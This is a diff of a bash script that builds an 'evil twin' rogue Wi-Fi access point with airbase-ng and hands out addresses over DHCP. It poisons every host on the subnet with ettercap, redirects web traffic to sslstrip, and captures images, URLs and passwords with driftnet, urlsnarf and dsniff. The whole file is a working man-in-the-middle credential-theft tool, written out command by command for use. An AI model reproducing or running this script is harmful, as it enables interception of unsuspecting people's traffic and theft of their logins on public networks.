@@ -1,67 +1,83 @@
 #----------------------------------------------------------------------#
 # This script is what I have taken from a script I found on the old BT
 # forums by Deathray. I modified it to fit my needs. -l3g10n
+
+#Actually -l3g10n sucks
 #----------------------------------------------------------------------#
+if ! grep 192.168.179.1 /etc/dhcp3/dhcpd.conf > /dev/null
+then echo "Did not find expected dhcp settings for 192.168.179.1 in dhcpd.conf"
+echo "Would you like to add the needed content? (y/n, c to continue anyways)"
+read -e CONFIRM
+if [[ "$CONFIRM" == "y" || "$CONFIRM" == "Y" ]]
+    then echo "" >> /etc/dhcp3/dhcpd.conf
+    echo "option domain-name-servers 192.168.179.1;" >> /etc/dhcp3/dhcpd.conf
+    echo "subnet 192.168.179.0 netmask 255.255.255.0 {" >> /etc/dhcp3/dhcpd.conf
+    echo "range 192.168.179.10 192.168.179.100;" >> /etc/dhcp3/dhcpd.conf
+    echo "option routers 192.168.179.1;" >> /etc/dhcp3/dhcpd.conf
+    echo "option domain-name-servers 192.168.179.1;" >> /etc/dhcp3/dhcpd.conf
+    echo "}" >> /etc/dhcp3/dhcpd.conf
+elif [[ "$CONFIRM" != "C" && "$CONFIRM" != "c" ]]
+    then echo "Terminating"
+    exit 1
+fi
+else echo "Proper DHCP settings found."
+fi
 
-# kill all dchp, collection, and processing software
-killall -9 dhcpd3 airbase-ng ettercap sslstrip driftnet urlsnarf tail
-# Kill all dchp processes
-#kill `cat /var/run/dhcp3-server/dhcpd.pid`
+echo "Enter the interface to set up the fake access point on (default: wlan1):"
+read -e eface
+if [[ "$eface" == "" ]]
+then eface=("wlan1")
+fi
 
-read -p "Enter the name of the interface connected to the internet, for example eth0: " IFACE
-airmon-ng
-read -p "Enter your wireless interface name, for example wlan0: " WIFACE
-read -p "Enter the ESSID you would like your rogue AP to be called, for example Free WiFi: " ESSID
-# Stop and bring down the wireless interface
-airmon-ng stop $WIFACE
-ifconfig $WIFACE down
-# Start and put up the wireless interface
-airmon-ng start $WIFACE
-ifconfig $WIFACE up
+echo "Enter the interface connected to the internet (default: wlan0):"
+read -e iface
+if [[ "$iface" == "" ]]
+then iface=("wlan0")
+fi
 
-# enable the tunneling module
-modprobe tun
+echo "Enter the name of the fake network to be made:"
+read -e essid
+if [[ "$essid" == "" ]]
+then essid=("default network")
+fi
 
-# Set up the fake access point
-echo Airbase-ng is going to create our fake AP with the SSID we specified
-  # Open airbase thing in new terminal
-xterm -bg black -fg yellow -e airbase-ng -e "$ESSID" -P -C 30 -v mon0  &
+echo "Starting Airmon-ng on $eface"
+airmon-ng start $eface &
+sleep 5
 
-# Keep the program from stumbling over itself
-sleep 10
+echo "Creating Symbolic Link"
+ln -s /var/run/dhcp3-server/dhcpd.pid /var/run/dhcpd.pid
 
-echo Configuring interface created by airdrop-ng
-# Put up and instantiate the tap interface at0 created by airbase
+echo "Creating Access Point with name $essid on channel 1"
+gnome-terminal --geometry=78x9+0+350 -x sh -c "airbase-ng -c 1 -e \"$essid\" mon0" &
+sleep 2
+
 ifconfig at0 up
-ifconfig at0 10.0.0.1 netmask 255.255.255.0
-ifconfig at0 mtu 1400
-route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+ifconfig at0 192.168.179.1 netmask 255.255.255.0
+route add -net 192.168.179.0 netmask 255.255.255.0 gw 192.168.179.1
 
+echo "Start DHCPD3 on interface at0"
+dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0
+echo "Start DNS Masq"
+/etc/init.d/dnsmasq restart
 
-echo 'Setting up iptables to handle traffic seen by the airdrop-ng (at0) interface'
-iptables --flush
-iptables --table nat --flush
-iptables --delete-chain
-iptables --table nat --delete-chain
-iptables -P FORWARD ACCEPT
-# set up new ip forwarding tables in MASQUERADE mode - forward all the things...  secretly
-iptables -t nat -A POSTROUTING -o $IFACE -j MASQUERADE
-
-# Begin the DCHP server using the modified redirect config file
-echo 'DHCP server starting on our airdrop-ng interface (at0)'
-dhcpd3 -f -cf dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid at0 &
-echo "Launching DMESG"
-xterm -e tail -f /var/log/messages &
 echo "Launching ettercap, poisoning all hosts on the at0 interface's subnet"
-xterm -e ettercap -T -q -p -l ettercap$(date +%F-%H%M).log -i at0 // // &
-sleep 8
+#gnome-terminal -x sh -c  "ettercap -T -q -p -l ettercap$(date +%F-%H%M).log -i at0" &
+gnome-terminal --geometry=78x16 -x  sh -c "ettercap -Tzqu -i at0" &
+sleep 4
 
 # Ensure IP forwarding is enabled
-echo 'Configuring ip forwarding'
-echo "1" > /proc/sys/net/ipv4/ip_forward
+#echo 'Configuring ip forwarding'
+#echo "1" > /proc/sys/net/ipv4/ip_forward
+
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
+iptables --table nat --append POSTROUTING --out-interface $iface -j MASQUERADE
+iptables --append FORWARD --in-interface at0 -j ACCEPT
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
 
 echo 'Launching various tools'
-#xterm -e sslstrip -a -k -f &
-#driftnet -v -i at0 &
-#xterm -e urlsnarf -i at0 &
-#xterm -e dsniff -m -i at0 -d -w dsniff$(date +%F-%H%M).log & 
+/root/Desktop/driftnet-0.1.6/driftnet -v -i at0 &
+gnome-terminal --geometry=121x10+0+600 -x  sh -c "urlsnarf -i at0" &
+gnome-terminal --geometry=31x4-1-1 -x  sh -c "dsniff -m -i at0 -d -w dsniff$(date +%F-%H%M).log"
+gnome-terminal --geometry=31x4-1-190 -x  sh -c "sslstrip -a -k -f" &
